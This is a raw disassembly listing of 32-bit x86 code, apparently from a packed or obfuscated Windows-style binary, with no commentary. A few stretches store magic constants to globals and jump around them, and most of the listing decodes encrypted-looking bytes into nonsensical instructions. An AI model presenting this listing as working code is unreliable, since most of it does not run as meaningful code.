  40204f:	sbb    al,ah
  402051:	xor    al,0xa9
  402053:	mov    ds:0x9de67f68,eax
  402058:	stc    
  402059:	mov    ds:0x585f60f7,al
  40205e:	inc    edi
  40205f:	ins    BYTE PTR es:[edi],dx
  402060:	test   ax,0x2432
  402064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402065:	adc    dh,BYTE PTR [ebx+0x8387813]
  40206b:	jle    0x4020b0
  40206d:	cmp    al,0x8c
  40206f:	mov    ebp,cs
  402071:	mov    edx,DWORD PTR [ebp-0x20]
  402074:	mov    DWORD PTR [ebp-0x2c],0x4eb9
  40207b:	mov    DWORD PTR ds:0x42efa4,0x6138
  402085:	cmp    eax,DWORD PTR [edx]
  402087:	mov    DWORD PTR ds:0x42e8da,0x1170
  402091:	je     0x40384c
  402097:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40209e:	sub    DWORD PTR ds:0x42e8e2,edx
  4020a4:	lea    eax,[ebp-0xc]
  4020a7:	mov    DWORD PTR [ebp-0x10],eax
  4020aa:	sub    edx,eax
  4020ac:	mov    eax,DWORD PTR [ebp-0x10]
  4020af:	not    edx
  4020b1:	jmp    0x402462
  4020b6:	inc    esi
  4020b7:	test   BYTE PTR [edx],bh
  4020b9:	xchg   esp,edi
  4020bb:	mov    ecx,0xed0c457b
  4020c0:	ror    BYTE PTR [esi-0x680da303],1
  4020c6:	into   
  4020c7:	or     al,0x7e
  4020c9:	jle    0x40204d
  4020cb:	jno    0x40214b
  4020cd:	jle    0x402052
  4020cf:	retf   0x9849
  4020d2:	push   edi
  4020d3:	xchg   ecx,eax
  4020d4:	and    esp,DWORD PTR [eax-0x267c7e39]
  4020da:	mov    cl,0x8e
  4020dc:	push   es
  4020dd:	cmp    eax,DWORD PTR [eax+0x64142db3]
  4020e3:	int3   
  4020e4:	or     ah,BYTE PTR [esp+ebx*4-0x2c1682ad]
  4020eb:	mov    BYTE PTR [ebx-0x61],ch
  4020ee:	xor    al,0x6f
  4020f0:	xor    edx,DWORD PTR [eax-0x26454562]
  4020f6:	push   ecx
  4020f7:	sahf   
  4020f8:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4020fa:	jp     0x40211d
  4020fc:	jne    0x402081
  4020fe:	mov    esi,0x113425f9
  402103:	jge    0x4020c9
  402105:	mov    DWORD PTR [eax+0x77c8fe70],eax
  40210b:	fisub  WORD PTR [ecx-0x3]
  40210e:	std    
  40210f:	mov    dl,0xe2
  402111:	push   cs
  402112:	loope  0x402108
  402114:	sub    eax,0xf6c36cf3
  402119:	leave  
  40211a:	fistp  DWORD PTR [ebx+ebx*2-0x3f]
  40211e:	pop    ebx
  40211f:	or     edx,DWORD PTR [edi+edx*8+0x18]
  402123:	ja     0x4020ca
  402125:	xor    ch,ah
  402127:	out    dx,eax
  402128:	and    bh,ch
  40212a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40212b:	mov    esp,0x73412588
  402130:	jl     0x402188
  402132:	retf   0x2723
  402135:	leave  
  402136:	xor    al,0xc5
  402138:	or     eax,DWORD PTR [ebp+0x79]
  40213b:	mov    bl,0x69
  40213d:	test   eax,0x80ccb36f
  402142:	mov    ebp,0x65927e1a
  402147:	sbb    ecx,DWORD PTR [eax-0x1b]
  40214a:	push   edi
  40214b:	shl    BYTE PTR [eax],cl
  40214d:	inc    ebp
  40214e:	mov    DWORD PTR [ecx],ecx
  402150:	fcomip st,st(5)
  402152:	sbb    ch,dh
  402154:	dec    ebx
  402155:	rcl    cl,cl
  402157:	or     BYTE PTR [ebx],al
  402159:	aas    
  40215a:	pop    dx
  40215c:	pop    edx
  40215d:	or     al,0x8f
  40215f:	xor    DWORD PTR [ebx-0x303bfada],esp
  402165:	in     al,0x38
  402167:	or     cl,BYTE PTR ds:0x537d78af
  40216d:	pop    ebp
  40216e:	scas   eax,DWORD PTR es:[edi]
  40216f:	and    dl,BYTE PTR [eax+ebx*1+0x1]
  402173:	dec    ebp
  402174:	jb     0x40214c
  402176:	imul   ebx,DWORD PTR [esi+0x0],0xffffff9a
  40217a:	cwde   
  40217b:	sbb    eax,ebx
  40217d:	jb     0x402181
  40217f:	dec    edx
  402180:	aas    
  402181:	lods   eax,DWORD PTR ds:[esi]
  402182:	dec    edi
  402183:	jno    0x40211f
  402185:	push   es
  402186:	mov    al,0x51
  402188:	sbb    al,0x5b
  40218a:	sbb    DWORD PTR [ecx],esi
  40218c:	inc    ecx
  40218d:	sti    
  40218e:	cli    
  40218f:	mov    esp,0x253fc45e
  402194:	and    bl,0x8d
  402197:	jo     0x402215
  402199:	js     0x4021e4
  40219b:	xchg   ah,al
  40219d:	gs push eax
  40219f:	or     bl,BYTE PTR [edi]
  4021a1:	fnstenv [ecx-0x69]
  4021a4:	lahf   
  4021a5:	ins    BYTE PTR es:[edi],dx
  4021a6:	mov    ecx,0x8326629b
  4021ab:	inc    ebp
  4021ac:	nop
  4021ad:	aam    0xf3
  4021af:	add    BYTE PTR [eax],al
  4021b1:	dec    esp
  4021b2:	rcr    dh,1
  4021b4:	nop
  4021b5:	push   ss
  4021b6:	mov    esi,0xb1c71dfb
  4021bb:	mov    dl,0xea
  4021bd:	call   0x5f697525
  4021c2:	push   ebp
  4021c3:	repnz mov esi,DWORD PTR [ebx-0x79]
  4021c7:	jbe    0x40215d
  4021c9:	mov    esp,0xda805696
  4021ce:	and    al,0xad
  4021d0:	ins    DWORD PTR es:[edi],dx
  4021d1:	push   es
  4021d2:	aad    0x60
  4021d4:	pop    esi
  4021d5:	pop    edx
  4021d6:	xchg   DWORD PTR [eax+edx*1+0x2b4acfc7],ecx
  4021dd:	leave  
  4021de:	fnstenv [edx-0x47]
  4021e1:	sti    
  4021e2:	cmp    eax,0xb0be0ad6
  4021e7:	pop    ebp
  4021e8:	mov    cl,0x83
  4021ea:	lock jl 0x40220b
  4021ed:	xchg   ebp,eax
  4021ee:	mov    DWORD PTR [eax-0x10],ebp
  4021f1:	xchg   ebp,eax
  4021f2:	or     BYTE PTR [edx-0x5c58d621],bh
  4021f8:	xchg   edx,eax
  4021f9:	mov    edi,0x666cb46f
  4021fe:	sbb    ebx,DWORD PTR [ebp-0x4b]
  402201:	push   ebx
  402202:	cmp    al,0xbc
  402204:	ins    DWORD PTR es:[edi],dx
  402205:	mov    edi,esp
  402207:	mov    cs,WORD PTR [ecx]
  402209:	ret    
  40220a:	loope  0x402258
  40220c:	dec    ebp
  40220d:	fisttp WORD PTR [edx]
  40220f:	push   ecx
  402210:	sub    eax,0x212506bc
  402215:	mov    eax,ds:0x25adf547
  40221a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40221b:	(bad)  
  40221c:	test   eax,0x15e2d8bc
  402221:	jmp    0x5d65:0x476507fb
  402228:	mov    ebx,0xc3c35319
  40222d:	test   DWORD PTR [edi+0x3f],esi
  402230:	mov    al,0x88
  402232:	bound  esi,QWORD PTR [ebx+0x3de1aff]
  402238:	mov    eax,0x1a5bccb2
  40223d:	inc    ebx
  40223e:	fidivr DWORD PTR [esp+edi*8+0x649b79ed]
  402245:	sbb    BYTE PTR [esi+eiz*1+0x22],ah
  402249:	inc    eax
  40224a:	jns    0x4022bb
  40224c:	sub    esi,ebp
  40224e:	in     eax,0x59
  402250:	mov    dh,cl
  402252:	push   edi
  402253:	xor    esp,edx
  402255:	lock les edx,FWORD PTR [edi+0x7d]
  402259:	nop
  40225a:	daa    
  40225b:	xor    eax,0x7e08851c
  402260:	jmp    0x402236
  402262:	sbb    dl,cl
  402264:	stos   BYTE PTR es:[edi],al
  402265:	sahf   
  402266:	jae    0x40220f
  402268:	test   BYTE PTR [ebx+0x107444c7],0xc2
  40226f:	mov    edi,ss
  402271:	pop    eax
  402272:	jecxz  0x4022a4
  402274:	mov    dh,0x9a
  402276:	inc    ebp
  402277:	and    al,0xba
  402279:	and    DWORD PTR [eax-0x1a4f6cc3],ebp
  40227f:	or     ch,BYTE PTR [esi]
  402281:	test   eax,0x35f60f7e
  402286:	into   
  402287:	ret    0x628
  40228a:	in     al,dx
  40228b:	lds    edx,FWORD PTR [ebx+ebp*4]
  40228e:	adc    ch,BYTE PTR cs:[ebx-0x5e]
  402292:	les    eax,FWORD PTR [edi]
  402294:	jl     0x402220
  402296:	jge    0x402302
  402298:	test   al,0x40
  40229a:	fistp  DWORD PTR [ebx-0x51]
  40229d:	cmp    eax,0x1c461409
  4022a2:	jle    0x402319
  4022a4:	(bad)  
  4022a5:	ins    BYTE PTR es:[edi],dx
  4022a6:	sbb    eax,0x864819f5
  4022ab:	sub    ebx,DWORD PTR [edx-0x3f]
  4022ae:	pop    edx
  4022af:	stos   DWORD PTR es:[edi],eax
  4022b0:	adc    eax,0xfab852b
  4022b5:	mov    cl,0xd8
  4022b7:	cmp    eax,0xd123c1e
  4022bc:	xchg   ebx,eax
  4022bd:	ret    0xbf4d
  4022c0:	(bad)  
  4022c1:	imul   eax,edx,0x27
  4022c4:	out    dx,al
  4022c5:	out    0x34,al
  4022c7:	adc    BYTE PTR [edi+ebx*2],cl
  4022ca:	xor    al,0x7d
  4022cc:	loop   0x4022d5
  4022ce:	ss inc edi
  4022d0:	or     DWORD PTR [edx-0x48],0x7c359ee
  4022d7:	cs inc ecx
  4022d9:	cmp    esp,DWORD PTR [esi+0x46]
  4022dc:	xor    esi,DWORD PTR [esi+0x57]
  4022df:	cwde   
  4022e0:	adc    BYTE PTR [edx+0x5c8e6bfc],0xd0
  4022e7:	sub    DWORD PTR [esi],ecx
  4022e9:	jecxz  0x402288
  4022eb:	jle    0x40230c
  4022ed:	ins    DWORD PTR es:[edi],dx
  4022ee:	clc    
  4022ef:	int3   
  4022f0:	jbe    0x40227c
  4022f2:	ins    DWORD PTR es:[edi],dx
  4022f3:	dec    edx
  4022f4:	cli    
  4022f5:	jns    0x4022d5
  4022f7:	fmulp  st(3),st
  4022f9:	xchg   edx,eax
  4022fa:	je     0x402341
  4022fc:	or     al,0x9c
  4022fe:	sub    DWORD PTR [ecx+ecx*1],eax
  402301:	out    0xcc,al
  402303:	cwde   
  402304:	fild   DWORD PTR [edx+0x5a]
  402307:	mov    ds:0x5a5bc1c3,al
  40230c:	fwait
  40230d:	rcr    bh,0x10
  402310:	push   esi
  402311:	xchg   BYTE PTR [edi+0x7],ch
  402314:	adc    al,0xe7
  402316:	repnz fst DWORD PTR [ebx-0x2b227939]
  40231d:	es mov esp,0xa9936073
  402323:	scas   al,BYTE PTR es:[edi]
  402324:	pop    ecx
  402325:	add    dl,BYTE PTR [esi-0x70261fc7]
  40232b:	fwait
  40232c:	inc    esp
  40232d:	call   0x1a9e:0xac88398c
  402334:	xor    al,BYTE PTR [bp+0x67]
  402338:	sbb    ah,BYTE PTR [ebp+edi*1+0x7842b150]
  40233f:	test   eax,0x19124e61
  402344:	(bad)  
  402345:	nop
  402346:	jg     0x40231d
  402348:	add    ebx,DWORD PTR [esi-0xc0e08a]
  40234e:	jno    0x402307
  402350:	dec    edi
  402351:	jmp    0x402336
  402353:	jle    0x402303
  402355:	xor    BYTE PTR [ebp-0x68],dh
  402358:	xchg   edi,eax
  402359:	xchg   edi,eax
  40235a:	jbe    0x40230c
  40235c:	or     BYTE PTR [esi-0x12605766],dh
  402362:	test   al,ch
  402364:	iret   
  402365:	fsub   QWORD PTR [eax+eiz*8-0x78]
  402369:	xchg   esp,eax
  40236a:	ins    DWORD PTR es:[edi],dx
  40236b:	(bad)  
  40236c:	mov    esp,0x494d191a
  402371:	sbb    BYTE PTR [ebx],cl
  402373:	lahf   
  402374:	pushf  
  402375:	es retf 
  402377:	push   ds
  402378:	call   0x2fb00c39
  40237d:	mov    edi,0x4eabf467
  402382:	mov    al,ds:0xcd406725
  402387:	sbb    eax,0x14737be6
  40238c:	adc    dh,BYTE PTR ds:0xfa928d29
  402392:	adc    cl,BYTE PTR [eax+0x68cd564b]
  402398:	pop    esi
  40239a:	pop    esp
  40239b:	and    BYTE PTR [eax],cl
  40239d:	lods   al,BYTE PTR ds:[esi]
  40239e:	inc    esi
  40239f:	popf   
  4023a0:	sbb    al,0x3b
  4023a2:	dec    ecx
  4023a3:	cmp    BYTE PTR ss:[edx-0x2d908338],cl
  4023aa:	or     al,0x30
  4023ac:	test   BYTE PTR [ebx-0x3d4ea149],dh
  4023b2:	ret    
  4023b3:	mov    ebx,0xef8fce3d
  4023b8:	sbb    al,dh
  4023ba:	xchg   esp,eax
  4023bb:	hlt    
  4023bc:	dec    edi
  4023bd:	add    DWORD PTR [edi-0x18],0xdd5d3f07
  4023c4:	mov    ebp,0xb10f6ffc
  4023c9:	dec    ebp
  4023ca:	xchg   dl,dh
  4023cc:	sub    BYTE PTR [eax+0x11],ah
  4023cf:	add    edi,DWORD PTR [eax+0x32]
  4023d2:	add    dh,ch
  4023d4:	enter  0x2285,0x16
  4023d8:	loop   0x4023e0
  4023da:	sbb    DWORD PTR [ebx],0xb9460821
  4023e0:	inc    si
  4023e2:	mov    ah,0x36
  4023e4:	pop    esi
  4023e5:	je     0x40236c
  4023e7:	cmc    
  4023e8:	bnd jp 0x402407
  4023eb:	or     DWORD PTR [eax+eiz*1-0x52ac7558],ecx
  4023f2:	inc    ecx
  4023f3:	shr    BYTE PTR [esi+ecx*2-0x4cfb91c9],1
  4023fa:	jmp    0x40242f
  4023fc:	xchg   ebx,eax
  4023fd:	repnz inc edi
  4023ff:	dec    ebx
  402400:	enter  0x711b,0x35
  402404:	mov    fs,WORD PTR [edi+0x5f50597d]
  40240a:	inc    esp
  40240b:	bound  ecx,QWORD PTR [ecx+edx*2]
  40240e:	sub    ebx,DWORD PTR [esi-0x7277f5ad]
  402414:	pop    DWORD PTR ds:0xf95494a3
  40241a:	xchg   ecx,eax
  40241b:	cdq    
  40241c:	sbb    bl,BYTE PTR [ecx-0x4dadacbf]
  402422:	adc    bh,BYTE PTR [ebp-0x4f]
  402425:	inc    DWORD PTR [si]
  402428:	jmp    0x402433
  40242a:	in     eax,0x0
  40242c:	fdivr  DWORD PTR [eax-0x620f04f3]
  402432:	mov    esi,0x2109c20a
  402437:	mul    BYTE PTR [edx+ecx*8+0x4b709183]
  40243e:	clc    
  40243f:	dec    ecx
  402440:	adc    eax,edx
  402442:	out    0xdd,al
  402444:	lods   al,BYTE PTR ds:[esi]
  402445:	loopne 0x402422
  402447:	popa   
  402448:	or     bl,BYTE PTR [eax]
  40244a:	or     BYTE PTR [esi-0x3df12197],ch
  402450:	retf   
  402451:	inc    esi
  402452:	inc    ebx
  402453:	jo     0x402463
  402455:	adc    BYTE PTR [ecx-0x6b],cl
  402458:	cwde   
  402459:	sub    BYTE PTR [edx+eiz*2],dh
  40245c:	outs   dx,DWORD PTR ds:[esi]
  40245d:	sbb    ecx,DWORD PTR [eax]
  40245f:	add    BYTE PTR [edi+0x1],dl
  402462:	mov    edx,DWORD PTR [eax]
  402464:	imul   edx,edx,0xf89ea9ee
  40246a:	mov    DWORD PTR ds:0x4306c6,0x7964
  402474:	mov    DWORD PTR [eax],edx
  402476:	mov    DWORD PTR ds:0x43063e,0x7646
  402480:	mov    eax,DWORD PTR [ebp-0xc]
  402483:	cmp    eax,0x823721f2
  402488:	mov    DWORD PTR ds:0x43063a,0x4bbf
  402492:	je     0x4028be
  402498:	and    ebx,0x6650
  40249e:	mov    eax,DWORD PTR [ebp-0x1c]
  4024a1:	jmp    0x402852
  4024a6:	inc    esi
  4024a7:	xchg   DWORD PTR [ecx],esp
  4024a9:	jmp    0x50e0:0xbb5d6ce1
  4024b0:	dec    eax
  4024b1:	xchg   ecx,eax
  4024b2:	aaa    
  4024b3:	call   0xf925003
  4024b8:	jle    0x402538
  4024ba:	xor    BYTE PTR [ecx+0x7e],0x7e
  4024be:	cmc    
  4024bf:	sub    al,0x49
  4024c1:	pop    edx
  4024c2:	imul   ebx,esp,0x58
  4024c5:	out    dx,al
  4024c6:	fild   QWORD PTR [ebp-0x7b]
  4024c9:	xchg   ah,dh
  4024cb:	add    eax,0x638260c
  4024d0:	mov    al,ds:0xaf2bdeed
  4024d5:	jnp    0x4024fc
  4024d7:	(bad)  
  4024d8:	pop    ds
  4024d9:	in     al,dx
  4024da:	and    eax,DWORD PTR [esi+0x6dff92d4]
  4024e0:	pop    esp
  4024e1:	or     eax,0x37ede2a7
  4024e6:	mov    ds:0xb23994d4,eax
  4024eb:	sub    BYTE PTR [eax-0x12466a8c],ah
  4024f1:	iret   
  4024f2:	mov    ch,0x66
  4024f4:	out    0x9b,al
  4024f6:	jl     0x4024a2
  4024f8:	jno    0x4024c9
  4024fa:	sub    al,0x70
  4024fc:	int    0xfd
  4024fe:	ins    BYTE PTR es:[edi],dx
  4024ff:	sbb    al,0xe
  402501:	pusha  
  402502:	inc    esp
  402503:	ret    0xc471
  402506:	add    BYTE PTR [ecx+0x457010f0],dl
  40250c:	pusha  
  40250d:	pop    ss
  40250e:	and    BYTE PTR [eax],0x12
  402511:	sbb    DWORD PTR [edx+0x37],0x8d18fbf
  402518:	div    DWORD PTR [esi-0x5ab14d15]
  40251e:	sahf   
  40251f:	gs jb  0x402514
  402522:	mov    al,ds:0x94102dad
  402527:	xor    bl,al
  402529:	cmp    edi,DWORD PTR [eax+0x2abe650]
  40252f:	adc    al,0xde
  402531:	lock js 0x402541
  402534:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402535:	cdq    
  402536:	xlat   BYTE PTR ds:[ebx]
  402537:	push   cs
  402538:	sahf   
  402539:	in     al,dx
  40253a:	into   
  40253b:	add    al,0x19
  40253d:	add    al,0x4a
  40253f:	js     0x402520
  402541:	xchg   BYTE PTR [esi+0x1a],ah
  402544:	arpl   WORD PTR [edx+0x937fceb],bp
  40254a:	out    dx,al
  40254b:	xchg   ebx,edx
  40254d:	jg     0x402542
  40254f:	in     al,0x3e
  402551:	popf   
  402552:	xchg   BYTE PTR [eax-0x3b3985b6],bh
  402558:	retf   
  402559:	cmp    al,0xf2
  40255b:	adc    edx,DWORD PTR [esi-0x75eb4a5e]
  402561:	add    eax,0x17c25461
  402566:	mov    ecx,0x83cd5daf
  40256b:	das    
  40256c:	test   eax,0xce8350de
  402571:	xchg   ebp,eax
  402572:	pop    eax
  402573:	lods   eax,DWORD PTR ds:[esi]
  402574:	aad    0x54
  402576:	ja     0x40254a
  402578:	jmp    FWORD PTR [edi]
  40257a:	dec    esp
  40257b:	and    dl,BYTE PTR [esi+0x35]
  40257e:	repnz and DWORD PTR ss:[ecx-0x1df3951c],ebp
  402586:	ret    
  402587:	mov    esp,0x2ab66099
  40258c:	(bad)  
  40258d:	sahf   
  40258e:	inc    edx
  40258f:	xchg   ebx,eax
  402590:	adc    DWORD PTR [ecx],0x55
  402593:	xchg   eax,edi
  402595:	mov    al,ds:0x26ff67e5
  40259b:	push   0x46
  40259d:	sbb    BYTE PTR ds:0xf0c64530,bh
  4025a3:	das    
  4025a4:	aam    0xf3
  4025a6:	rcr    DWORD PTR [ebx],1
  4025a8:	imul   ebp,DWORD PTR [edx+0x68],0x7db9367c
  4025af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025b0:	mov    esi,0x8347868d
  4025b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025b6:	and    ch,BYTE PTR [esi-0x36]
  4025b9:	fwait
  4025ba:	add    DWORD PTR [edi+0x6c],eax
  4025bd:	mov    ebp,DWORD PTR [ebx-0x20770ece]
  4025c3:	push   ecx
  4025c4:	sbb    DWORD PTR [esi-0x2da8cce7],ecx
  4025ca:	mov    edx,0x325f3472
  4025cf:	aas    
  4025d0:	fbld   TBYTE PTR [ebp+0x4a]
  4025d3:	ss int3 
  4025d5:	in     eax,0x5e
  4025d7:	fld    QWORD PTR [ebp-0x2dd7bd39]
  4025dd:	(bad)  
  4025de:	push   ebx
  4025df:	or     dh,BYTE PTR [edi-0x2c5729fd]
  4025e5:	jg     0x402596
  4025e7:	push   esi
  4025e8:	push   0x75
  4025ea:	nop
  4025eb:	in     al,dx
  4025ec:	sub    dl,dl
  4025ee:	add    dl,BYTE PTR ds:0xa683ac62
  4025f4:	inc    ecx
  4025f5:	pop    ebp
  4025f6:	add    al,0x6d
  4025f8:	push   esp
  4025f9:	pop    esp
  4025fa:	xor    dh,BYTE PTR [esi]
  4025fc:	sub    DWORD PTR [edi-0x7c],eax
  4025ff:	inc    ebx
  402600:	mov    WORD PTR [ecx-0x5d47a192],gs
  402606:	addr16 jl 0x4025f8
  402609:	ror    BYTE PTR [ecx-0x1d7c7041],cl
  40260f:	sahf   
  402610:	scas   eax,DWORD PTR es:[edi]
  402611:	div    DWORD PTR [ebx]
  402613:	(bad)  [edi+ebx*8]
  402616:	mov    ch,0x65
  402618:	lea    esp,[edi]
  40261a:	adc    DWORD PTR [eax],edi
  40261c:	mov    edi,ecx
  40261e:	and    al,0x9e
  402620:	addr16 je 0x40261e
  402623:	inc    esp
  402624:	mov    esp,0xfa89b48d
  402629:	call   0x101da112
  40262e:	mov    al,ds:0x5d86d7b9
  402633:	aas    
  402634:	ror    DWORD PTR [eax],0x3c
  402637:	(bad)  
  402638:	ja     0x40264b
  40263a:	add    esi,esp
  40263c:	out    0x6e,al
  40263e:	jl     0x40266c
  402640:	adc    ebp,DWORD PTR [esi]
  402642:	mov    bh,0x62
  402644:	pop    ecx
  402645:	dec    esi
  402646:	pusha  
  402647:	jecxz  0x4026b2
  402649:	add    bh,BYTE PTR [esi+ecx*2-0x19]
  40264d:	je     0x402680
  40264f:	pop    eax
  402650:	mov    ds:0x4973ce1a,eax
  402655:	jmp    0xf3e4483b
  40265a:	or     DWORD PTR [ebx+0x1e03262],eax
  402660:	lods   eax,DWORD PTR ds:[esi]
  402661:	pop    ebx
  402662:	jmp    0x4026dd
  402664:	inc    ebx
  402665:	cmp    al,0xb0
  402667:	push   esi
  402668:	prefetcht0 BYTE PTR [esi-0x5f5073cd]
  40266f:	xchg   ebx,edx
  402671:	pop    ss
  402672:	cmp    cl,bh
  402674:	mov    BYTE PTR [edi+0x52],bh
  402677:	xchg   dl,al
  402679:	and    bl,BYTE PTR [edx]
  40267b:	in     al,dx
  40267c:	adc    ch,BYTE PTR [esi+0x3b2861ff]
  402682:	outs   dx,DWORD PTR ds:[esi]
  402683:	pop    es
  402684:	xchg   edx,eax
  402685:	jo     0x40261d
  402687:	xchg   edx,eax
  402688:	lds    esi,FWORD PTR [esi]
  40268a:	pop    ebp
  40268b:	leave  
  40268c:	jecxz  0x40268f
  40268e:	jg     0x4026c6
  402690:	mov    dh,0x3f
  402692:	pop    ds
  402693:	inc    ecx
  402694:	scas   eax,DWORD PTR es:[edi]
  402695:	jg     0x4026fd
  402697:	fstp   TBYTE PTR [ebx]
  402699:	cmp    dh,bh
  40269b:	scas   al,BYTE PTR es:[edi]
  40269c:	test   DWORD PTR [ecx+0x13679462],ebx
  4026a2:	ret    0xe0df
  4026a5:	adc    ecx,esi
  4026a7:	pop    edx
  4026a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026a9:	in     al,dx
  4026aa:	jl     0x40268b
  4026ac:	sbb    edx,edx
  4026ae:	scas   eax,DWORD PTR es:[edi]
  4026af:	jmp    0xc11502e9
  4026b4:	ret    0x7907
  4026b7:	lods   eax,DWORD PTR ds:[esi]
  4026b8:	leave  
  4026b9:	aam    0x8a
  4026bb:	pop    eax
  4026bc:	xchg   BYTE PTR [esi-0x22],dl
  4026bf:	jmp    0x10b6:0x1b171fa4
  4026c6:	bound  edx,QWORD PTR [esi]
  4026c8:	arpl   WORD PTR [esi],bx
  4026ca:	test   DWORD PTR [edi+eax*4-0x36],eax
  4026ce:	mov    dl,0xf1
  4026d0:	nop
  4026d1:	inc    DWORD PTR [ecx-0x4e]
  4026d4:	or     eax,0xe8d2013a
  4026d9:	push   ebp
  4026da:	scas   eax,DWORD PTR es:[edi]
  4026db:	and    DWORD PTR [ecx+esi*8+0x4c],eax
  4026df:	push   esi
  4026e0:	mov    eax,ds:0x9b3b8412
  4026e5:	outs   dx,BYTE PTR ds:[esi]
  4026e6:	das    
  4026e7:	xor    cl,bl
  4026e9:	pop    edi
  4026ea:	inc    ecx
  4026eb:	add    DWORD PTR [eax],esp
  4026ed:	(bad)  
  4026ee:	dec    ebp
  4026ef:	ret    0x15a1
  4026f2:	aam    0x8e
  4026f4:	stc    
  4026f5:	adc    al,0xad
  4026f7:	pusha  
  4026f8:	bound  ebp,QWORD PTR [ecx+0x28]
  4026fb:	(bad)  
  4026fc:	js     0x40270d
  4026fe:	add    al,dl
  402700:	adc    BYTE PTR [esi],dh
  402702:	rcl    DWORD PTR [ebx-0x45],1
  402705:	in     eax,dx
  402706:	fs jmp 0x402701
  402709:	mov    DWORD PTR [edx+edi*2+0x4c],esp
  40270d:	test   al,0xc4
  40270f:	or     ebx,DWORD PTR [ebp+0x2f]
  402712:	stos   DWORD PTR es:[edi],eax
  402713:	icebp  
  402714:	dec    ebp
  402715:	outs   dx,DWORD PTR ds:[esi]
  402716:	or     ebp,DWORD PTR [edx-0x58]
  402719:	xlat   BYTE PTR ds:[ebx]
  40271a:	cld    
  40271b:	adc    al,0x76
  40271d:	push   esp
  40271e:	add    esp,esi
  402720:	mov    ch,0x77
  402722:	lods   al,BYTE PTR ds:[esi]
  402723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402724:	mov    bl,0x26
  402726:	add    eax,0xf887ea20
  40272b:	push   ecx
  40272c:	jno    0x4026b0
  40272e:	jmp    FWORD PTR gs:[eax+0xb]
  402732:	push   DWORD PTR [ebp+0x73f908af]
  402738:	inc    ecx
  402739:	or     BYTE PTR [edx+0x2a],al
  40273c:	fstp   TBYTE PTR [ecx+0x71]
  40273f:	pop    esi
  402740:	or     BYTE PTR [ebx+ebp*1-0x35d58a5e],dl
  402747:	test   BYTE PTR [ecx+0x1a],dh
  40274a:	push   ebx
  40274b:	js     0x40272a
  40274d:	int3   
  40274e:	mov    ecx,0x3cdea1d3
  402753:	xchg   edi,eax
  402754:	fwait
  402755:	or     dl,BYTE PTR [ebp-0x5b]
  402758:	inc    eax
  402759:	outs   dx,BYTE PTR ds:[esi]
  40275a:	aad    0x9
  40275c:	sub    esi,DWORD PTR [ebx-0x71]
  40275f:	pop    eax
  402760:	int3   
  402761:	add    DWORD PTR [ebx+eax*1],esi
  402764:	fistp  QWORD PTR [edx-0x2f]
  402767:	repz dec esp
  402769:	arpl   WORD PTR [ebx-0x25e87147],di
  40276f:	fwait
  402770:	ja     0x4027f1
  402772:	or     BYTE PTR [eax-0x1fff06ad],al
  402778:	mov    bl,0x8
  40277a:	or     dh,BYTE PTR [ebx-0x68]
  40277d:	jno    0x4027ea
  40277f:	adc    ch,al
  402781:	ins    BYTE PTR es:[edi],dx
  402782:	xor    al,0xff
  402784:	push   ebp
  402785:	or     DWORD PTR [esi+0x21],eax
  402788:	jb     0x402745
  40278a:	lods   eax,DWORD PTR ds:[esi]
  40278b:	cld    
  40278c:	cmp    BYTE PTR [edx],dl
  40278e:	rcr    DWORD PTR ss:[edx+0x6a],0xb8
  402793:	aam    0x29
  402795:	dec    esp
  402796:	dec    esp
  402797:	xor    DWORD PTR [ebx+0x4cba4a74],eax
  40279d:	add    al,cl
  40279f:	js     0x40279f
  4027a1:	mov    esi,ecx
  4027a3:	lods   eax,DWORD PTR ds:[esi]
  4027a4:	mov    ch,0x40
  4027a6:	dec    esi
  4027a7:	mov    dl,BYTE PTR [esi-0x66]
  4027aa:	mov    ds:0x27f6557a,al
  4027af:	jl     0x4027b5
  4027b1:	into   
  4027b2:	je     0x40276e
  4027b4:	pop    ss
  4027b5:	aam    0x26
  4027b7:	and    DWORD PTR [edx],esp
  4027b9:	pop    esp
  4027ba:	add    eax,0xd775fb94
  4027bf:	mov    dh,0x90
  4027c1:	xchg   ebp,eax
  4027c2:	xchg   esi,eax
  4027c3:	(bad)  
  4027c5:	cmp    eax,0xc7d5ab45
  4027ca:	fiadd  WORD PTR [ebp+0x4d]
  4027cd:	inc    ebx
  4027ce:	std    
  4027cf:	sub    DWORD PTR [ecx+ebp*1+0x3a],esi
  4027d3:	push   esi
  4027d4:	sub    BYTE PTR [edi],dl
  4027d6:	nop
  4027d7:	clc    
  4027d8:	dec    eax
  4027d9:	jnp    0x402815
  4027db:	mov    ?,WORD PTR [edx-0x4b88dfeb]
  4027e1:	fisubr WORD PTR [eax+eiz*1]
  4027e4:	paddb  mm0,QWORD PTR [ebp-0x1d]
  4027e8:	add    ebx,DWORD PTR [edi+0x39f9e345]
  4027ee:	mov    ch,0x29
  4027f0:	add    al,0x66
  4027f2:	das    
  4027f3:	test   al,0x52
  4027f5:	daa    
  4027f6:	(bad)  
  4027f7:	ror    DWORD PTR [edx-0x1],cl
  4027fa:	inc    ebx
  4027fb:	popf   
  4027fc:	xchg   esp,eax
  4027fd:	mov    ah,0xf0
  4027ff:	popf   
  402800:	ins    BYTE PTR es:[edi],dx
  402801:	or     BYTE PTR [eax+ebp*1],0xd8
  402805:	jge    0x40282f
  402807:	xor    esi,DWORD PTR [ebx-0x6bac179a]
  40280d:	in     al,dx
  40280e:	mov    al,0xe2
  402810:	nop
  402811:	mov    ch,0x94
  402813:	dec    edx
  402814:	imul   esp,DWORD PTR [ecx+0x20],0xc4e4d8dd
  40281b:	or     ebp,eax
  40281d:	jge    0x4027d8
  40281f:	push   ss
  402820:	xor    eax,0x82963198
  402825:	or     ebp,DWORD PTR [ecx+eax*1-0x57]
  402829:	lods   al,BYTE PTR ds:[esi]
  40282a:	sbb    dl,BYTE PTR [eax]
  40282c:	imul   esi,edx,0xbbe98a6
  402832:	test   BYTE PTR [edx-0x68],0xcc
  402836:	shr    ch,1
  402838:	scas   eax,DWORD PTR es:[edi]
